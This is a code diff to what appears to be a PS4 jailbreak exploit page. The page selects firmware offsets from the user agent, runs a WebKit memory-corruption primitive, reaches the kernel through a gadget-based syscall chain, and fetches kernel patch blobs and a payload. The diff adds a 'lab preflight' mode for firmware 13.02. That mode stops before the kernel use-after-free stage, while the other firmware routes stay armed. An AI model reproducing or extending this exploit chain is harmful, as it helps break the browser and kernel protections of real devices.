@@ -12,6 +12,7 @@ const lines = [];
 let passCount = 0, failCount = 0;
 const params = new URLSearchParams(location.search);
 const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";
+const LAB_PREFLIGHT_1302 = params.get("lab") === "1302-preflight";
 
 function post(tag, detail) {
     try {
@@ -133,16 +134,27 @@ let allDone = false;
         const { key, off } = offsetsFor(navigator.userAgent);
         mark("FW", key || "(not a PS4 UA)");
         if (!off) { state("no offsets for this firmware", "bad"); return; }
+
+        const labOnly = !!off.lab_only;
+        const labPreflight = labOnly && key === "13.02" && LAB_PREFLIGHT_1302;
+        if (labOnly && !labPreflight) {
+            mark("LAB-LOCKED", "firmware=" + key + " requires ?lab=1302-preflight");
+            state("LAB route locked — use Diagnostics", "warn");
+            return;
+        }
+
         mark("FW-STATUS", off.fw_status || "none");
         mark("PLAN", "iov_workers=" + NUM_IOV_WORKER + " attempts=" + NUM_ATTEMPT
             + " spray=" + NUM_IOV_SPRAY
-            + " mode=" + (STOP_BEFORE_DOUBLE ? "stop-before-double" : "armed"));
+            + " mode=" + (labPreflight ? "lab-userland-preflight"
+                : STOP_BEFORE_DOUBLE ? "stop-before-double" : "armed"));
 
         let kpatch = null, payload = null;
         // off.kpatch wins when a firmware shares another's kernel and therefore
         // its blob -- 12.02 uses 1200.bin. Otherwise derive it from the key.
-        const kpatchName = off && off.kpatch ? "patches/" + off.kpatch
-            : key ? "patches/" + key.replace(".", "") + ".bin" : null;
+        const kpatchName = labPreflight ? null :
+            (off && off.kpatch ? "patches/" + off.kpatch
+            : key ? "patches/" + key.replace(".", "") + ".bin" : null);
         const KPATCH_JMP_SITES = [];
         try {
             if (kpatchName) {
@@ -163,14 +175,19 @@ let allDone = false;
             ? "blob=" + kpatchName + " bytes=" + kpatch.length
               + " sites=" + KPATCH_JMP_SITES.length
             : "blob=" + kpatchName + " MISSING");
-        try {
-            const r = await fetch(window.TaysonSelectedPayloadPath || "payload.bin");
-            if (r.ok) payload = new Uint8Array(await r.arrayBuffer());
-        } catch (e) { mark("PAYLOAD-FETCH-THREW", e.message); }
-        mark("PAYLOAD-BLOB", payload
-            ? "bytes=" + payload.length + " entry="
-              + (payload[0] === 0xe9 ? "e9-jmp-rel32" : "NOT-e9")
-            : "MISSING");
+        if (!labPreflight) {
+            try {
+                const r = await fetch(window.TaysonSelectedPayloadPath || "payload.bin");
+                if (r.ok) payload = new Uint8Array(await r.arrayBuffer());
+            } catch (e) { mark("PAYLOAD-FETCH-THREW", e.message); }
+            mark("PAYLOAD-BLOB", payload
+                ? "bytes=" + payload.length + " entry="
+                  + (payload[0] === 0xe9 ? "e9-jmp-rel32" : "NOT-e9")
+                : "MISSING");
+        } else {
+            mark("PAYLOAD-BLOB", "SKIPPED lab-preflight");
+            mark("KPATCH-BLOB", "SKIPPED lab-preflight");
+        }
 
         state("running the primitive...", "warn");
         await new Promise(r => setTimeout(r, 0));
@@ -393,8 +410,22 @@ let allDone = false;
             return (a.hi === 0 && a.low === 0) ? -1 : p.read4(a) | 0;
         }
         const pid = sc(SYS.getpid).i32;
-        check("chain-reaches-kernel", pid > 0,
+        const syscallOk = check("chain-reaches-kernel", pid > 0,
             "pid=" + pid + " uid=" + sc(SYS.getuid).i32);
+
+        if (labPreflight) {
+            mark("LAB-PREFLIGHT-DONE",
+                "firmware=13.02 webkit-base=ok gadgets=ok libkernel=ok syscall-stubs=ok "
+                + "kernel-uaf=NOT-STARTED kpatch=NOT-LOADED payload=NOT-LOADED");
+            state(
+                syscallOk
+                    ? "13.02 LAB PREFLIGHT OK — kernel path not executed"
+                    : "13.02 LAB PREFLIGHT FAILED — kernel path not executed",
+                syscallOk ? "ok" : "bad"
+            );
+            allDone = syscallOk;
+            return;
+        }
 
         const scratchAb = new ArrayBuffer(0x1000); keepAlive.push(scratchAb);
         const scratch = bufAddr(scratchAb);
